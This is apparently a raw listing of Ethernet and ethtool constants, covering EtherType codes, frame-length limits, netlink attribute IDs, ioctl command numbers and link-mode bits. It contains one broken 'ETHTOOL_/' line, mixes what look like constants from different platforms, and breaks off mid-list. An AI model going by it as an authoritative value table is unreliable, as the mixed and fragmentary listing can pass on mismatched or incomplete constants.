ETHERTYPE_TALARISMC               = 0x852b
ETHERTYPE_TCPCOMP                 = 0x876b
ETHERTYPE_TCPSM                   = 0x9002
ETHERTYPE_TEC                     = 0x814f
ETHERTYPE_TIGAN                   = 0x802f
ETHERTYPE_TRAIL                   = 0x1000
ETHERTYPE_TRANSETHER              = 0x6558
ETHERTYPE_TYMSHARE                = 0x802e
ETHERTYPE_UBBST                   = 0x7005
ETHERTYPE_UBDEBUG                 = 0x900
ETHERTYPE_UBDIAGLOOP              = 0x7002
ETHERTYPE_UBDL                    = 0x7000
ETHERTYPE_UBNIU                   = 0x7001
ETHERTYPE_UBNMC                   = 0x7003
ETHERTYPE_VALID                   = 0x1600
ETHERTYPE_VARIAN                  = 0x80dd
ETHERTYPE_VAXELN                  = 0x803b
ETHERTYPE_VEECO                   = 0x8067
ETHERTYPE_VEXP                    = 0x805b
ETHERTYPE_VGLAB                   = 0x8131
ETHERTYPE_VINES                   = 0xbad
ETHERTYPE_VINESECHO               = 0xbaf
ETHERTYPE_VINESLOOP               = 0xbae
ETHERTYPE_VITAL                   = 0xff00
ETHERTYPE_VLAN                    = 0x8100
ETHERTYPE_VLTLMAN                 = 0x8080
ETHERTYPE_VPROD                   = 0x805c
ETHERTYPE_VURESERVED              = 0x8147
ETHERTYPE_WATERLOO                = 0x8130
ETHERTYPE_WELLFLEET               = 0x8103
ETHERTYPE_X25                     = 0x805
ETHERTYPE_X75                     = 0x801
ETHERTYPE_XNSSM                   = 0x9001
ETHERTYPE_XTP                     = 0x817d
ETHER_ADDR_LEN                    = 0x6
ETHER_ALIGN                       = 0x2
ETHER_CRC_LEN                     = 0x4
ETHER_CRC_POLY_BE                 = 0x4c11db6
ETHER_CRC_POLY_LE                 = 0xedb88320
ETHER_FLOW                                  = 0x12
ETHER_HDR_LEN                     = 0xe
ETHER_MAX_DIX_LEN                 = 0x600
ETHER_MAX_HARDMTU_LEN             = 0xff9b
ETHER_MAX_LEN                     = 0x5ee
ETHER_MAX_LEN_JUMBO               = 0x233a
ETHER_MIN_LEN                     = 0x40
ETHER_PPPOE_ENCAP_LEN             = 0x8
ETHER_TYPE_LEN                    = 0x2
ETHER_VLAN_ENCAP_LEN              = 0x4
ETHTOOL_/ 
ETHTOOL_A_BITSET_BITS                     = 0x3
ETHTOOL_A_BITSET_BITS_BIT                 = 0x1
ETHTOOL_A_BITSET_BITS_MAX                 = 0x1
ETHTOOL_A_BITSET_BITS_UNSPEC              = 0x0
ETHTOOL_A_BITSET_BIT_INDEX                = 0x1
ETHTOOL_A_BITSET_BIT_MAX                  = 0x3
ETHTOOL_A_BITSET_BIT_NAME                 = 0x2
ETHTOOL_A_BITSET_BIT_UNSPEC               = 0x0
ETHTOOL_A_BITSET_BIT_VALUE                = 0x3
ETHTOOL_A_BITSET_MASK                     = 0x5
ETHTOOL_A_BITSET_MAX                      = 0x5
ETHTOOL_A_BITSET_NOMASK                   = 0x1
ETHTOOL_A_BITSET_SIZE                     = 0x2
ETHTOOL_A_BITSET_UNSPEC                   = 0x0
ETHTOOL_A_BITSET_VALUE                    = 0x4
ETHTOOL_A_CABLE_AMPLITUDE_MAX             = 0x2
ETHTOOL_A_CABLE_AMPLITUDE_PAIR            = 0x1
ETHTOOL_A_CABLE_AMPLITUDE_UNSPEC          = 0x0
ETHTOOL_A_CABLE_AMPLITUDE_mV              = 0x2
ETHTOOL_A_CABLE_FAULT_LENGTH_CM           = 0x2
ETHTOOL_A_CABLE_FAULT_LENGTH_MAX          = 0x2
ETHTOOL_A_CABLE_FAULT_LENGTH_PAIR         = 0x1
ETHTOOL_A_CABLE_FAULT_LENGTH_UNSPEC       = 0x0
ETHTOOL_A_CABLE_NEST_FAULT_LENGTH         = 0x2
ETHTOOL_A_CABLE_NEST_MAX                  = 0x2
ETHTOOL_A_CABLE_NEST_RESULT               = 0x1
ETHTOOL_A_CABLE_NEST_UNSPEC               = 0x0
ETHTOOL_A_CABLE_PAIR_A                    = 0x0
ETHTOOL_A_CABLE_PAIR_B                    = 0x1
ETHTOOL_A_CABLE_PAIR_C                    = 0x2
ETHTOOL_A_CABLE_PAIR_D                    = 0x3
ETHTOOL_A_CABLE_PULSE_MAX                 = 0x1
ETHTOOL_A_CABLE_PULSE_UNSPEC              = 0x0
ETHTOOL_A_CABLE_PULSE_mV                  = 0x1
ETHTOOL_A_CABLE_RESULT_CODE               = 0x2
ETHTOOL_A_CABLE_RESULT_CODE_CROSS_SHORT   = 0x4
ETHTOOL_A_CABLE_RESULT_CODE_OK            = 0x1
ETHTOOL_A_CABLE_RESULT_CODE_OPEN          = 0x2
ETHTOOL_A_CABLE_RESULT_CODE_SAME_SHORT    = 0x3
ETHTOOL_A_CABLE_RESULT_CODE_UNSPEC        = 0x0
ETHTOOL_A_CABLE_RESULT_MAX                = 0x2
ETHTOOL_A_CABLE_RESULT_PAIR               = 0x1
ETHTOOL_A_CABLE_RESULT_UNSPEC             = 0x0
ETHTOOL_A_CABLE_STEP_FIRST_DISTANCE       = 0x1
ETHTOOL_A_CABLE_STEP_LAST_DISTANCE        = 0x2
ETHTOOL_A_CABLE_STEP_MAX                  = 0x3
ETHTOOL_A_CABLE_STEP_STEP_DISTANCE        = 0x3
ETHTOOL_A_CABLE_STEP_UNSPEC               = 0x0
ETHTOOL_A_CABLE_TDR_NEST_AMPLITUDE        = 0x2
ETHTOOL_A_CABLE_TDR_NEST_MAX              = 0x3
ETHTOOL_A_CABLE_TDR_NEST_PULSE            = 0x3
ETHTOOL_A_CABLE_TDR_NEST_STEP             = 0x1
ETHTOOL_A_CABLE_TDR_NEST_UNSPEC           = 0x0
ETHTOOL_A_CABLE_TEST_HEADER               = 0x1
ETHTOOL_A_CABLE_TEST_MAX                  = 0x1
ETHTOOL_A_CABLE_TEST_NTF_HEADER           = 0x1
ETHTOOL_A_CABLE_TEST_NTF_MAX              = 0x3
ETHTOOL_A_CABLE_TEST_NTF_NEST             = 0x3
ETHTOOL_A_CABLE_TEST_NTF_STATUS           = 0x2
ETHTOOL_A_CABLE_TEST_NTF_STATUS_COMPLETED = 0x2
ETHTOOL_A_CABLE_TEST_NTF_STATUS_STARTED   = 0x1
ETHTOOL_A_CABLE_TEST_NTF_STATUS_UNSPEC    = 0x0
ETHTOOL_A_CABLE_TEST_NTF_UNSPEC           = 0x0
ETHTOOL_A_CABLE_TEST_TDR_CFG              = 0x2
ETHTOOL_A_CABLE_TEST_TDR_CFG_FIRST        = 0x1
ETHTOOL_A_CABLE_TEST_TDR_CFG_LAST         = 0x2
ETHTOOL_A_CABLE_TEST_TDR_CFG_MAX          = 0x4
ETHTOOL_A_CABLE_TEST_TDR_CFG_PAIR         = 0x4
ETHTOOL_A_CABLE_TEST_TDR_CFG_STEP         = 0x3
ETHTOOL_A_CABLE_TEST_TDR_CFG_UNSPEC       = 0x0
ETHTOOL_A_CABLE_TEST_TDR_HEADER           = 0x1
ETHTOOL_A_CABLE_TEST_TDR_MAX              = 0x2
ETHTOOL_A_CABLE_TEST_TDR_NTF_HEADER       = 0x1
ETHTOOL_A_CABLE_TEST_TDR_NTF_MAX          = 0x3
ETHTOOL_A_CABLE_TEST_TDR_NTF_NEST         = 0x3
ETHTOOL_A_CABLE_TEST_TDR_NTF_STATUS       = 0x2
ETHTOOL_A_CABLE_TEST_TDR_NTF_UNSPEC       = 0x0
ETHTOOL_A_CABLE_TEST_TDR_UNSPEC           = 0x0
ETHTOOL_A_CABLE_TEST_UNSPEC               = 0x0
ETHTOOL_A_CHANNELS_COMBINED_COUNT         = 0x9
ETHTOOL_A_CHANNELS_COMBINED_MAX           = 0x5
ETHTOOL_A_CHANNELS_HEADER                 = 0x1
ETHTOOL_A_CHANNELS_MAX                    = 0x9
ETHTOOL_A_CHANNELS_OTHER_COUNT            = 0x8
ETHTOOL_A_CHANNELS_OTHER_MAX              = 0x4
ETHTOOL_A_CHANNELS_RX_COUNT               = 0x6
ETHTOOL_A_CHANNELS_RX_MAX                 = 0x2
ETHTOOL_A_CHANNELS_TX_COUNT               = 0x7
ETHTOOL_A_CHANNELS_TX_MAX                 = 0x3
ETHTOOL_A_CHANNELS_UNSPEC                 = 0x0
ETHTOOL_A_COALESCE_HEADER                 = 0x1
ETHTOOL_A_COALESCE_MAX                    = 0x19
ETHTOOL_A_COALESCE_PKT_RATE_HIGH          = 0x12
ETHTOOL_A_COALESCE_PKT_RATE_LOW           = 0xd
ETHTOOL_A_COALESCE_RATE_SAMPLE_INTERVAL   = 0x17
ETHTOOL_A_COALESCE_RX_MAX_FRAMES          = 0x3
ETHTOOL_A_COALESCE_RX_MAX_FRAMES_HIGH     = 0x14
ETHTOOL_A_COALESCE_RX_MAX_FRAMES_IRQ      = 0x5
ETHTOOL_A_COALESCE_RX_MAX_FRAMES_LOW      = 0xf
ETHTOOL_A_COALESCE_RX_USECS               = 0x2
ETHTOOL_A_COALESCE_RX_USECS_HIGH          = 0x13
ETHTOOL_A_COALESCE_RX_USECS_IRQ           = 0x4
ETHTOOL_A_COALESCE_RX_USECS_LOW           = 0xe
ETHTOOL_A_COALESCE_STATS_BLOCK_USECS      = 0xa
ETHTOOL_A_COALESCE_TX_MAX_FRAMES          = 0x7
ETHTOOL_A_COALESCE_TX_MAX_FRAMES_HIGH     = 0x16
ETHTOOL_A_COALESCE_TX_MAX_FRAMES_IRQ      = 0x9
ETHTOOL_A_COALESCE_TX_MAX_FRAMES_LOW      = 0x11
ETHTOOL_A_COALESCE_TX_USECS               = 0x6
ETHTOOL_A_COALESCE_TX_USECS_HIGH          = 0x15
ETHTOOL_A_COALESCE_TX_USECS_IRQ           = 0x8
ETHTOOL_A_COALESCE_TX_USECS_LOW           = 0x10
ETHTOOL_A_COALESCE_UNSPEC                 = 0x0
ETHTOOL_A_COALESCE_USE_ADAPTIVE_RX        = 0xb
ETHTOOL_A_COALESCE_USE_ADAPTIVE_TX        = 0xc
ETHTOOL_A_COALESCE_USE_CQE_MODE_RX        = 0x19
ETHTOOL_A_COALESCE_USE_CQE_MODE_TX        = 0x18
ETHTOOL_A_DEBUG_HEADER                    = 0x1
ETHTOOL_A_DEBUG_MAX                       = 0x2
ETHTOOL_A_DEBUG_MSGMASK                   = 0x2
ETHTOOL_A_DEBUG_UNSPEC                    = 0x0
ETHTOOL_A_EEE_ACTIVE                      = 0x4
ETHTOOL_A_EEE_ENABLED                     = 0x5
ETHTOOL_A_EEE_HEADER                      = 0x1
ETHTOOL_A_EEE_MAX                         = 0x7
ETHTOOL_A_EEE_MODES_OURS                  = 0x2
ETHTOOL_A_EEE_MODES_PEER                  = 0x3
ETHTOOL_A_EEE_TX_LPI_ENABLED              = 0x6
ETHTOOL_A_EEE_TX_LPI_TIMER                = 0x7
ETHTOOL_A_EEE_UNSPEC                      = 0x0
ETHTOOL_A_FEATURES_ACTIVE                 = 0x4
ETHTOOL_A_FEATURES_HEADER                 = 0x1
ETHTOOL_A_FEATURES_HW                     = 0x2
ETHTOOL_A_FEATURES_MAX                    = 0x5
ETHTOOL_A_FEATURES_NOCHANGE               = 0x5
ETHTOOL_A_FEATURES_UNSPEC                 = 0x0
ETHTOOL_A_FEATURES_WANTED                 = 0x3
ETHTOOL_A_HEADER_DEV_INDEX                = 0x1
ETHTOOL_A_HEADER_DEV_NAME                 = 0x2
ETHTOOL_A_HEADER_FLAGS                    = 0x3
ETHTOOL_A_HEADER_MAX                      = 0x3
ETHTOOL_A_HEADER_UNSPEC                   = 0x0
ETHTOOL_A_LINKINFO_HEADER                 = 0x1
ETHTOOL_A_LINKINFO_MAX                    = 0x6
ETHTOOL_A_LINKINFO_PHYADDR                = 0x3
ETHTOOL_A_LINKINFO_PORT                   = 0x2
ETHTOOL_A_LINKINFO_TP_MDIX                = 0x4
ETHTOOL_A_LINKINFO_TP_MDIX_CTRL           = 0x5
ETHTOOL_A_LINKINFO_TRANSCEIVER            = 0x6
ETHTOOL_A_LINKINFO_UNSPEC                 = 0x0
ETHTOOL_A_LINKMODES_AUTONEG               = 0x2
ETHTOOL_A_LINKMODES_DUPLEX                = 0x6
ETHTOOL_A_LINKMODES_HEADER                = 0x1
ETHTOOL_A_LINKMODES_LANES                 = 0x9
ETHTOOL_A_LINKMODES_MASTER_SLAVE_CFG      = 0x7
ETHTOOL_A_LINKMODES_MASTER_SLAVE_STATE    = 0x8
ETHTOOL_A_LINKMODES_MAX                   = 0x9
ETHTOOL_A_LINKMODES_OURS                  = 0x3
ETHTOOL_A_LINKMODES_PEER                  = 0x4
ETHTOOL_A_LINKMODES_SPEED                 = 0x5
ETHTOOL_A_LINKMODES_UNSPEC                = 0x0
ETHTOOL_A_LINKSTATE_EXT_STATE             = 0x5
ETHTOOL_A_LINKSTATE_EXT_SUBSTATE          = 0x6
ETHTOOL_A_LINKSTATE_HEADER                = 0x1
ETHTOOL_A_LINKSTATE_LINK                  = 0x2
ETHTOOL_A_LINKSTATE_MAX                   = 0x6
ETHTOOL_A_LINKSTATE_SQI                   = 0x3
ETHTOOL_A_LINKSTATE_SQI_MAX               = 0x4
ETHTOOL_A_LINKSTATE_UNSPEC                = 0x0
ETHTOOL_A_PAUSE_AUTONEG                   = 0x2
ETHTOOL_A_PAUSE_HEADER                    = 0x1
ETHTOOL_A_PAUSE_MAX                       = 0x5
ETHTOOL_A_PAUSE_RX                        = 0x3
ETHTOOL_A_PAUSE_STATS                     = 0x5
ETHTOOL_A_PAUSE_STAT_MAX                  = 0x3
ETHTOOL_A_PAUSE_STAT_PAD                  = 0x1
ETHTOOL_A_PAUSE_STAT_RX_FRAMES            = 0x3
ETHTOOL_A_PAUSE_STAT_TX_FRAMES            = 0x2
ETHTOOL_A_PAUSE_STAT_UNSPEC               = 0x0
ETHTOOL_A_PAUSE_TX                        = 0x4
ETHTOOL_A_PAUSE_UNSPEC                    = 0x0
ETHTOOL_A_PRIVFLAGS_FLAGS                 = 0x2
ETHTOOL_A_PRIVFLAGS_HEADER                = 0x1
ETHTOOL_A_PRIVFLAGS_MAX                   = 0x2
ETHTOOL_A_PRIVFLAGS_UNSPEC                = 0x0
ETHTOOL_A_RINGS_CQE_SIZE                  = 0xc
ETHTOOL_A_RINGS_HEADER                    = 0x1
ETHTOOL_A_RINGS_MAX                       = 0xd
ETHTOOL_A_RINGS_RX                        = 0x6
ETHTOOL_A_RINGS_RX_BUF_LEN                = 0xa
ETHTOOL_A_RINGS_RX_JUMBO                  = 0x8
ETHTOOL_A_RINGS_RX_JUMBO_MAX              = 0x4
ETHTOOL_A_RINGS_RX_MAX                    = 0x2
ETHTOOL_A_RINGS_RX_MINI                   = 0x7
ETHTOOL_A_RINGS_RX_MINI_MAX               = 0x3
ETHTOOL_A_RINGS_TCP_DATA_SPLIT            = 0xb
ETHTOOL_A_RINGS_TX                        = 0x9
ETHTOOL_A_RINGS_TX_MAX                    = 0x5
ETHTOOL_A_RINGS_TX_PUSH                   = 0xd
ETHTOOL_A_RINGS_UNSPEC                    = 0x0
ETHTOOL_A_STRINGSETS_MAX                  = 0x1
ETHTOOL_A_STRINGSETS_STRINGSET            = 0x1
ETHTOOL_A_STRINGSETS_UNSPEC               = 0x0
ETHTOOL_A_STRINGSET_COUNT                 = 0x2
ETHTOOL_A_STRINGSET_ID                    = 0x1
ETHTOOL_A_STRINGSET_MAX                   = 0x3
ETHTOOL_A_STRINGSET_STRINGS               = 0x3
ETHTOOL_A_STRINGSET_UNSPEC                = 0x0
ETHTOOL_A_STRINGS_MAX                     = 0x1
ETHTOOL_A_STRINGS_STRING                  = 0x1
ETHTOOL_A_STRINGS_UNSPEC                  = 0x0
ETHTOOL_A_STRING_INDEX                    = 0x1
ETHTOOL_A_STRING_MAX                      = 0x2
ETHTOOL_A_STRING_UNSPEC                   = 0x0
ETHTOOL_A_STRING_VALUE                    = 0x2
ETHTOOL_A_STRSET_COUNTS_ONLY              = 0x3
ETHTOOL_A_STRSET_HEADER                   = 0x1
ETHTOOL_A_STRSET_MAX                      = 0x3
ETHTOOL_A_STRSET_STRINGSETS               = 0x2
ETHTOOL_A_STRSET_UNSPEC                   = 0x0
ETHTOOL_A_TSINFO_HEADER                   = 0x1
ETHTOOL_A_TSINFO_MAX                      = 0x5
ETHTOOL_A_TSINFO_PHC_INDEX                = 0x5
ETHTOOL_A_TSINFO_RX_FILTERS               = 0x4
ETHTOOL_A_TSINFO_TIMESTAMPING             = 0x2
ETHTOOL_A_TSINFO_TX_TYPES                 = 0x3
ETHTOOL_A_TSINFO_UNSPEC                   = 0x0
ETHTOOL_A_TUNNEL_INFO_HEADER              = 0x1
ETHTOOL_A_TUNNEL_INFO_MAX                 = 0x2
ETHTOOL_A_TUNNEL_INFO_UDP_PORTS           = 0x2
ETHTOOL_A_TUNNEL_INFO_UNSPEC              = 0x0
ETHTOOL_A_TUNNEL_UDP_ENTRY_MAX            = 0x2
ETHTOOL_A_TUNNEL_UDP_ENTRY_PORT           = 0x1
ETHTOOL_A_TUNNEL_UDP_ENTRY_TYPE           = 0x2
ETHTOOL_A_TUNNEL_UDP_ENTRY_UNSPEC         = 0x0
ETHTOOL_A_TUNNEL_UDP_MAX                  = 0x1
ETHTOOL_A_TUNNEL_UDP_TABLE                = 0x1
ETHTOOL_A_TUNNEL_UDP_TABLE_ENTRY          = 0x3
ETHTOOL_A_TUNNEL_UDP_TABLE_MAX            = 0x3
ETHTOOL_A_TUNNEL_UDP_TABLE_SIZE           = 0x1
ETHTOOL_A_TUNNEL_UDP_TABLE_TYPES          = 0x2
ETHTOOL_A_TUNNEL_UDP_TABLE_UNSPEC         = 0x0
ETHTOOL_A_TUNNEL_UDP_UNSPEC               = 0x0
ETHTOOL_A_WOL_HEADER                      = 0x1
ETHTOOL_A_WOL_MAX                         = 0x3
ETHTOOL_A_WOL_MODES                       = 0x2
ETHTOOL_A_WOL_SOPASS                      = 0x3
ETHTOOL_A_WOL_UNSPEC                      = 0x0
ETHTOOL_BUSINFO_LEN                         = 0x20
ETHTOOL_EROMVERS_LEN                        = 0x20
ETHTOOL_FEC_AUTO                            = 0x2
ETHTOOL_FEC_AUTO_BIT                                                    = 0x1
ETHTOOL_FEC_BASER                           = 0x10
ETHTOOL_FEC_BASER_BIT                                                   = 0x4
ETHTOOL_FEC_LLRS                            = 0x20
ETHTOOL_FEC_LLRS_BIT                                                    = 0x5
ETHTOOL_FEC_NONE                            = 0x1
ETHTOOL_FEC_NONE_BIT                                                    = 0x0
ETHTOOL_FEC_OFF                             = 0x4
ETHTOOL_FEC_OFF_BIT                                                     = 0x2
ETHTOOL_FEC_RS                              = 0x8
ETHTOOL_FEC_RS_BIT                                                      = 0x3
ETHTOOL_FLAG_ALL                            = 0x7
ETHTOOL_FLAG_COMPACT_BITSETS                = 0x1
ETHTOOL_FLAG_OMIT_REPLY                     = 0x2
ETHTOOL_FLAG_STATS                          = 0x4
ETHTOOL_FLASHDEV                            = 0x33
ETHTOOL_FLASH_ALL_REGIONS                                               = 0x0
ETHTOOL_FLASH_MAX_FILENAME                  = 0x80
ETHTOOL_FWVERS_LEN                          = 0x20
ETHTOOL_F_COMPAT                            = 0x4
ETHTOOL_F_COMPAT__BIT                                                   = 0x2
ETHTOOL_F_UNSUPPORTED                       = 0x1
ETHTOOL_F_UNSUPPORTED__BIT                                              = 0x0
ETHTOOL_F_WISH                              = 0x2
ETHTOOL_F_WISH__BIT                                                     = 0x1
ETHTOOL_GCHANNELS                           = 0x3c
ETHTOOL_GCOALESCE                           = 0xe
ETHTOOL_GDRVINFO                            = 0x3
ETHTOOL_GEEE                                = 0x44
ETHTOOL_GEEPROM                             = 0xb
ETHTOOL_GENL_VERSION                        = 0x1
ETHTOOL_GET_DUMP_DATA                       = 0x40
ETHTOOL_GET_DUMP_FLAG                       = 0x3f
ETHTOOL_GET_TS_INFO                         = 0x41
ETHTOOL_GFEATURES                           = 0x3a
ETHTOOL_GFECPARAM                           = 0x50
ETHTOOL_GFLAGS                              = 0x25
ETHTOOL_GGRO                                = 0x2b
ETHTOOL_GGSO                                = 0x23
ETHTOOL_GLINK                               = 0xa
ETHTOOL_GLINKSETTINGS                       = 0x4c
ETHTOOL_GMODULEEEPROM                       = 0x43
ETHTOOL_GMODULEINFO                         = 0x42
ETHTOOL_GMSGLVL                             = 0x7
ETHTOOL_GPAUSEPARAM                         = 0x12
ETHTOOL_GPERMADDR                           = 0x20
ETHTOOL_GPFLAGS                             = 0x27
ETHTOOL_GPHYSTATS                           = 0x4a
ETHTOOL_GREGS                               = 0x4
ETHTOOL_GRINGPARAM                          = 0x10
ETHTOOL_GRSSH                               = 0x46
ETHTOOL_GRXCLSRLALL                         = 0x30
ETHTOOL_GRXCLSRLCNT                         = 0x2e
ETHTOOL_GRXCLSRULE                          = 0x2f
ETHTOOL_GRXCSUM                             = 0x14
ETHTOOL_GRXFH                               = 0x29
ETHTOOL_GRXFHINDIR                          = 0x38
ETHTOOL_GRXNTUPLE                           = 0x36
ETHTOOL_GRXRINGS                            = 0x2d
ETHTOOL_GSET                                = 0x1
ETHTOOL_GSG                                 = 0x18
ETHTOOL_GSSET_INFO                          = 0x37
ETHTOOL_GSTATS                              = 0x1d
ETHTOOL_GSTRINGS                            = 0x1b
ETHTOOL_GTSO                                = 0x1e
ETHTOOL_GTUNABLE                            = 0x48
ETHTOOL_GTXCSUM                             = 0x16
ETHTOOL_GUFO                                = 0x21
ETHTOOL_GWOL                                = 0x5
ETHTOOL_ID_UNSPEC                                                       = 0x0
ETHTOOL_LINK_EXT_STATE_AUTONEG                                          = 0x0
ETHTOOL_LINK_EXT_STATE_BAD_SIGNAL_INTEGRITY                             = 0x3
ETHTOOL_LINK_EXT_STATE_CABLE_ISSUE                                      = 0x5
ETHTOOL_LINK_EXT_STATE_CALIBRATION_FAILURE                              = 0x7
ETHTOOL_LINK_EXT_STATE_EEPROM_ISSUE                                     = 0x6
ETHTOOL_LINK_EXT_STATE_LINK_LOGICAL_MISMATCH                            = 0x2
ETHTOOL_LINK_EXT_STATE_LINK_TRAINING_FAILURE                            = 0x1
ETHTOOL_LINK_EXT_STATE_NO_CABLE                                         = 0x4
ETHTOOL_LINK_EXT_STATE_OVERHEAT                                         = 0x9
ETHTOOL_LINK_EXT_STATE_POWER_BUDGET_EXCEEDED                            = 0x8
ETHTOOL_LINK_EXT_SUBSTATE_AN_ACK_NOT_RECEIVED                           = 0x2
ETHTOOL_LINK_EXT_SUBSTATE_AN_FEC_MISMATCH_DURING_OVERRIDE               = 0x5
ETHTOOL_LINK_EXT_SUBSTATE_AN_NEXT_PAGE_EXCHANGE_FAILED                  = 0x3
ETHTOOL_LINK_EXT_SUBSTATE_AN_NO_HCD                                     = 0x6
ETHTOOL_LINK_EXT_SUBSTATE_AN_NO_PARTNER_DETECTED                        = 0x1
ETHTOOL_LINK_EXT_SUBSTATE_AN_NO_PARTNER_DETECTED_FORCE_MODE             = 0x4
ETHTOOL_LINK_EXT_SUBSTATE_BSI_LARGE_NUMBER_OF_PHYSICAL_ERRORS           = 0x1
ETHTOOL_LINK_EXT_SUBSTATE_BSI_UNSUPPORTED_RATE                          = 0x2
ETHTOOL_LINK_EXT_SUBSTATE_CI_CABLE_TEST_FAILURE                         = 0x2
ETHTOOL_LINK_EXT_SUBSTATE_CI_UNSUPPORTED_CABLE                          = 0x1
ETHTOOL_LINK_EXT_SUBSTATE_LLM_FC_FEC_IS_NOT_LOCKED                      = 0x4
ETHTOOL_LINK_EXT_SUBSTATE_LLM_PCS_DID_NOT_ACQUIRE_AM_LOCK               = 0x2
ETHTOOL_LINK_EXT_SUBSTATE_LLM_PCS_DID_NOT_ACQUIRE_BLOCK_LOCK            = 0x1
ETHTOOL_LINK_EXT_SUBSTATE_LLM_PCS_DID_NOT_GET_ALIGN_STATUS              = 0x3
ETHTOOL_LINK_EXT_SUBSTATE_LLM_RS_FEC_IS_NOT_LOCKED                      = 0x5
ETHTOOL_LINK_EXT_SUBSTATE_LT_KR_FRAME_LOCK_NOT_ACQUIRED                 = 0x1
ETHTOOL_LINK_EXT_SUBSTATE_LT_KR_LINK_INHIBIT_TIMEOUT                    = 0x2
ETHTOOL_LINK_EXT_SUBSTATE_LT_KR_LINK_PARTNER_DID_NOT_SET_RECEIVER_READY = 0x3
ETHTOOL_LINK_EXT_SUBSTATE_LT_REMOTE_FAULT                               = 0x4
ETHTOOL_LINK_MODE_100000baseCR2_Full_BIT                                = 0x3b
ETHTOOL_LINK_MODE_100000baseCR4_Full_BIT                                = 0x26
ETHTOOL_LINK_MODE_100000baseCR_Full_BIT                                 = 0x4e
ETHTOOL_LINK_MODE_100000baseDR2_Full_BIT                                = 0x3d
ETHTOOL_LINK_MODE_100000baseDR_Full_BIT                                 = 0x4f
ETHTOOL_LINK_MODE_100000baseKR2_Full_BIT                                = 0x39
ETHTOOL_LINK_MODE_100000baseKR4_Full_BIT                                = 0x24
ETHTOOL_LINK_MODE_100000baseKR_Full_BIT                                 = 0x4b
ETHTOOL_LINK_MODE_100000baseLR2_ER2_FR2_Full_BIT                        = 0x3c
ETHTOOL_LINK_MODE_100000baseLR4_ER4_Full_BIT                            = 0x27
ETHTOOL_LINK_MODE_100000baseLR_ER_FR_Full_BIT                           = 0x4d
ETHTOOL_LINK_MODE_100000baseSR2_Full_BIT                                = 0x3a
ETHTOOL_LINK_MODE_100000baseSR4_Full_BIT                                = 0x25
ETHTOOL_LINK_MODE_100000baseSR_Full_BIT                                 = 0x4c
ETHTOOL_LINK_MODE_10000baseCR_Full_BIT                                  = 0x2a
ETHTOOL_LINK_MODE_10000baseER_Full_BIT                                  = 0x2e
ETHTOOL_LINK_MODE_10000baseKR_Full_BIT                                  = 0x13
ETHTOOL_LINK_MODE_10000baseKX4_Full_BIT                                 = 0x12
ETHTOOL_LINK_MODE_10000baseLRM_Full_BIT                                 = 0x2d
ETHTOOL_LINK_MODE_10000baseLR_Full_BIT                                  = 0x2c
ETHTOOL_LINK_MODE_10000baseR_FEC_BIT                                    = 0x14
ETHTOOL_LINK_MODE_10000baseSR_Full_BIT                                  = 0x2b
ETHTOOL_LINK_MODE_10000baseT_Full_BIT                                   = 0xc
ETHTOOL_LINK_MODE_1000baseKX_Full_BIT                                   = 0x11
ETHTOOL_LINK_MODE_1000baseT1_Full_BIT                                   = 0x44
ETHTOOL_LINK_MODE_1000baseT_Full_BIT                                    = 0x5
ETHTOOL_LINK_MODE_1000baseT_Half_BIT                                    = 0x4
ETHTOOL_LINK_MODE_1000baseX_Full_BIT                                    = 0x29
ETHTOOL_LINK_MODE_100baseFX_Full_BIT                                    = 0x5b
ETHTOOL_LINK_MODE_100baseFX_Half_BIT                                    = 0x5a
ETHTOOL_LINK_MODE_100baseT1_Full_BIT                                    = 0x43
ETHTOOL_LINK_MODE_100baseT_Full_BIT                                     = 0x3
ETHTOOL_LINK_MODE_100baseT_Half_BIT                                     = 0x2
ETHTOOL_LINK_MODE_10baseT_Full_BIT                                      = 0x1
ETHTOOL_LINK_MODE_10baseT_Half_BIT                                      = 0x0
ETHTOOL_LINK_MODE_200000baseCR2_Full_BIT                                = 0x54
ETHTOOL_LINK_MODE_200000baseCR4_Full_BIT                                = 0x42
ETHTOOL_LINK_MODE_200000baseDR2_Full_BIT                                = 0x53
ETHTOOL_LINK_MODE_200000baseDR4_Full_BIT                                = 0x41
ETHTOOL_LINK_MODE_200000baseKR2_Full_BIT                                = 0x50
ETHTOOL_LINK_MODE_200000baseKR4_Full_BIT                                = 0x3e
ETHTOOL_LINK_MODE_200000baseLR2_ER2_FR2_Full_BIT                        = 0x52
ETHTOOL_LINK_MODE_200000baseLR4_ER4_FR4_Full_BIT                        = 0x40
ETHTOOL_LINK_MODE_200000baseSR2_Full_BIT                                = 0x51
ETHTOOL_LINK_MODE_200000baseSR4_Full_BIT                                = 0x3f
ETHTOOL_LINK_MODE_20000baseKR2_Full_BIT                                 = 0x16
ETHTOOL_LINK_MODE_20000baseMLD2_Full_BIT                                = 0x15
ETHTOOL_LINK_MODE_25000baseCR_Full_BIT                                  = 0x1f
ETHTOOL_LINK_MODE_25000baseKR_Full_BIT                                  = 0x20
ETHTOOL_LINK_MODE_25000baseSR_Full_BIT                                  = 0x21
ETHTOOL_LINK_MODE_2500baseT_Full_BIT                                    = 0x2f
ETHTOOL_LINK_MODE_2500baseX_Full_BIT                                    = 0xf
ETHTOOL_LINK_MODE_400000baseCR4_Full_BIT                                = 0x59
ETHTOOL_LINK_MODE_400000baseCR8_Full_BIT                                = 0x49
ETHTOOL_LINK_MODE_400000baseDR4_Full_BIT                                = 0x58
ETHTOOL_LINK_MODE_400000baseDR8_Full_BIT                                = 0x48
ETHTOOL_LINK_MODE_400000baseKR4_Full_BIT                                = 0x55
ETHTOOL_LINK_MODE_400000baseKR8_Full_BIT                                = 0x45
ETHTOOL_LINK_MODE_400000baseLR4_ER4_FR4_Full_BIT                        = 0x57
ETHTOOL_LINK_MODE_400000baseLR8_ER8_FR8_Full_BIT                        = 0x47
ETHTOOL_LINK_MODE_400000baseSR4_Full_BIT                                = 0x56
ETHTOOL_LINK_MODE_400000baseSR8_Full_BIT                                = 0x46
ETHTOOL_LINK_MODE_40000baseCR4_Full_BIT                                 = 0x18
ETHTOOL_LINK_MODE_40000baseKR4_Full_BIT                                 = 0x17
ETHTOOL_LINK_MODE_40000baseLR4_Full_BIT                                 = 0x1a
ETHTOOL_LINK_MODE_40000baseSR4_Full_BIT                                 = 0x19
ETHTOOL_LINK_MODE_50000baseCR2_Full_BIT                                 = 0x22
ETHTOOL_LINK_MODE_50000baseCR_Full_BIT                                  = 0x36
ETHTOOL_LINK_MODE_50000baseDR_Full_BIT                                  = 0x38
ETHTOOL_LINK_MODE_50000baseKR2_Full_BIT                                 = 0x23
